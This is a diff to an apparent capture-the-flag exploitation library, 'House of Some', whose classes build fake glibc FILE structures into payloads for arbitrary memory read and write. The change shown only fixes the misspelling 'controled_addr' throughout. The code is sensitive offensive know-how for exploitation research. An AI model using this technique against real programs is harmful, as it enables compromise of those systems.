@@ -11,11 +11,11 @@ from typing import Callable
 
 class HouseOfSome:
 
-    def __init__(self, libc: ELF, controled_addr: int = 0, zero_addr: int = 0):
+    def __init__(self, libc: ELF, controlled_addr: int = 0, zero_addr: int = 0):
         self.libc = libc
-        if controled_addr == 0:
-            controled_addr = self.libc.symbols['_environ'] + 0x10
-        self.controled_addr =controled_addr
+        if controlled_addr == 0:
+            controlled_addr = self.libc.symbols['_environ'] + 0x10
+        self.controlled_addr =controlled_addr
         self.READ_LENGTH_DEFAULT = 0x400
         self.LEAK_LENGTH = 0x500
         self.zero_addr = zero_addr
@@ -76,7 +76,7 @@ class HouseOfSome:
 
         self.panel = max(self.hoi_read_file_length * 2, self.write_file_length + self.hoi_read_file_length)
         self.switch = 0
-        self.addr_panel = [self.controled_addr, self.controled_addr+self.panel]
+        self.addr_panel = [self.controlled_addr, self.controlled_addr+self.panel]
 
         self.functions = [
             (f.address, f) for f in self.libc.functions.values()
@@ -96,14 +96,14 @@ class HouseOfSome:
         return self.addr_panel[0] + self.panel * 2
     
     def read(self, fd, buf, len, end=0):
-        addr = self.controled_addr
+        addr = self.controlled_addr
         f_read_file_0 = self.hoi_read_file_template(buf, len, addr+self.hoi_read_file_length, fd) 
         # f_wide_data = self.fake_wide_data_template()
         addr += self.hoi_read_file_length
-        self.controled_addr = self._next_control_addr(self.controled_addr, self.hoi_read_file_length * 2)
-        f_read_file_1 = self.hoi_read_file_template(self.controled_addr, 
+        self.controlled_addr = self._next_control_addr(self.controlled_addr, self.hoi_read_file_length * 2)
+        f_read_file_1 = self.hoi_read_file_template(self.controlled_addr, 
                                                      self.READ_LENGTH_DEFAULT, 
-                                                     0 if end else self.controled_addr, 
+                                                     0 if end else self.controlled_addr, 
                                                      0) 
         
         payload = flat([
@@ -114,14 +114,14 @@ class HouseOfSome:
         return payload
     
     def get_first_fake_file(self):
-        return self.hoi_read_file_template(self.controled_addr, 0x400, self.controled_addr, 0)
+        return self.hoi_read_file_template(self.controlled_addr, 0x400, self.controlled_addr, 0)
  
     def write(self, fd, buf, len):
-        addr = self.controled_addr
+        addr = self.controlled_addr
         f_write_file = self.fake_file_write_template(buf, buf+len, addr+self.write_file_length, fd) 
         addr += self.write_file_length
-        self.controled_addr = self._next_control_addr(self.controled_addr, self.hoi_read_file_length + self.write_file_length)
-        f_read_file_1 = self.hoi_read_file_template(self.controled_addr, self.READ_LENGTH_DEFAULT, self.controled_addr, 0) 
+        self.controlled_addr = self._next_control_addr(self.controlled_addr, self.hoi_read_file_length + self.write_file_length)
+        f_read_file_1 = self.hoi_read_file_template(self.controlled_addr, self.READ_LENGTH_DEFAULT, self.controlled_addr, 0) 
         
         payload = flat([
             f_write_file,
@@ -347,12 +347,12 @@ class HouseOfSome2:
     def __init__(self, 
                  libc: ELF, 
                  fake_stdout_addr: int = 0, 
-                 controled_addr: int = 0, 
+                 controlled_addr: int = 0, 
                  zero_addr: int = 0, 
                  _IO_wfile_jumps_maybe_mmap: int = 0, 
                  _IO_str_jumps: int = 0):
         self.libc = ELF_with_DWARF.from_ELF(libc)
-        self.hos = HouseOfSome(self.libc, controled_addr, zero_addr)
+        self.hos = HouseOfSome(self.libc, controlled_addr, zero_addr)
         if fake_stdout_addr == 0:
             fake_stdout_addr = self.libc.symbols['_IO_2_1_stdout_']
             log.success(f"Using Default _IO_2_1_stdout_ as fake_stdout_addr: {fake_stdout_addr:#x}")
